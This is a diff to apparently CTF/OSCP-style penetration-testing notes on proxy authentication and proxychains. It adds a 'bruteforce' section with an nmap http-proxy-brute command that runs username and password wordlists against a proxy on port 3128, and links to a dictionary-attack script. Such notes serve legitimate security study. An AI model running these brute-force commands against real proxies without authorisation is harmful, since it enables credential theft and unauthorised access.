@@ -4,6 +4,7 @@
   * [Proxy Authentication](#proxy-authentication)
     * [Open Authentication](#open-authentication)
     * [username and password](#username-and-password)
+    * [bruteforce](#bruteforce)
   * [Proxychains](#proxychains)
     * [Configure proxychain](#configure-proxychain)
     * [Proxychain with `nmap`](#proxychain-with-nmap)
@@ -68,7 +69,13 @@ curl -x http://user:password@proxy-IP-here:port url-of-website:port
 # Example 2
 curl -x admin:laurie@192.142.49.3:3128 127.0.0.1:1996
 ```
-
+### bruteforce
+#### nmap
+```sh
+nmap --script http-proxy-brute -p3128 192.144.18.3 --script-args userdb=usernames.lst,passdb=passwords.lst
+```
+#### bash script
+<https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts.md#proxy-authentication-dictionary-attk>
 ## Proxychains
 
 Proxychains is a tool which forces the TCP connection to go through the configured proxy(s). Proxychians can force the connection through multiple proxy servers. For e.g, if you have the following proxychains configuration (with strict chain option):
